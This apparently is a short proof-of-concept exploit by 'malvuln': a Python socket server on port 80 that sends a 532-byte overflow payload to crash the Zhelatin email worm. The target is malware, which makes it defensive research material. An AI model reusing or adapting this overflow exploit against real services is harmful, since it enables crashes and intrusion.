Exploit/PoC:
import socket

port=80
payload="A"*532

def doit():
    global payload
    s = socket.socket()
    try:
        host = ''
        s.bind((host, port))
        s.listen(5)

        print('Email-Worm.Win32.Zhelatin.ago / Remote Stack Buffer Overflow')
        print('MD5: 0418e7f95a8b94c035e10749234f8378')
        print("By malvuln")

        while True:
            conn, addr = s.accept()
            conn.send(payload+'\r\n')
            conn.close()
    except Exception as e:
        pass

if __name__=="__main__":
    doit()



